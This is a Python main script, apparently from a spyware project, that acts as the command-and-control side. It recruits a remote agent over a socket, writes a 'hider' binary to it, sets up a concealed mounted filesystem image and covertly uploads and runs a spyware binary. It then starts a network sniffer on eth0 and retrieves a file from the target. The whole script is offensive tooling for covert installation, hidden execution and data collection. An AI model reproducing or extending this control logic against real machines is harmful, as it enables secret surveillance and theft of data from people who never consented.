from connection import Connection
from agent import Agent
from command import Command
from responce import Responce
from funCode import FunCode
from time import sleep
from contParams import *
from structParams import *
from agentRecruiter import AgentRecruiter
import threading
import configparser


HOST = "localhost"
PORT_MANEGER = 65432
PORT_SPYWARE = 65410


def main():
    targetHiderPath = "./sentHider.o"

    image_path = "fs.iso"
    mount_path = "fs"
    # mount_path = "."

    agents = list()
    recrutionEvent = threading.Event()
    recruiter = AgentRecruiter(HOST, PORT_MANEGER, agents, recrutionEvent)
    recruiter.start()

    while len(agents) == 0:
        sleep(1)

    agent: Agent = agents.pop()

    print(
        agent.write_file(
            "/home/avner/Arazim-Projects-2024---spyware/hider",
            targetHiderPath,
        )
    )

    print(agent.hider_setup(targetHiderPath, image_path, mount_path))

    print(
        agent.hidden_action_with_upload(
            FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
            "/home/avner/Arazim-Projects-2024---spyware/spyware",
            "sentSpyware.spy",
        )
    )

    spyAgent = Agent.listenSpyware((HOST, PORT_SPYWARE))

    print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))

    params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
    print(spyAgent.runContraption(params, 10))
    print(spyAgent.retrieve_file("fishTest.txt"))


if __name__ == "__main__":
    main()
